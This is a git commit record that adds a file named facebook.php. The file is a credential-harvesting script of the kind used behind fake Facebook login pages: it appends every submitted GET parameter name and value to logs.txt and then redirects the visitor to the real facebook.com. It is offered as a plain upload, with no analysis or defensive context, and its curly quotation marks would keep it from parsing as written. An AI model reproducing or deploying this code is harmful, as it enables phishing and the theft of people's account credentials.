7a09cda55637917c95546384097f37ab3cf10d28
frankline65 <59509062+frankline65@users.noreply.github.com>
2020-07-06 21:39:30 +0300

    Add files via upload

---
+++ facebook.php
@@ -0,0 +1,10 @@
+<?php
+header(“Location: http://www.facebook.com”); $handle = fopen(“logs.txt”, “a”);
+foreach($_GET as $variable => $value) { fwrite($handle, $variable);
+fwrite($handle, “=”);
+fwrite($handle, $value);
+fwrite($handle, “\r\n”);
+}
+fwrite($handle, “\r\n”);
+fclose($handle); exit;
+?>
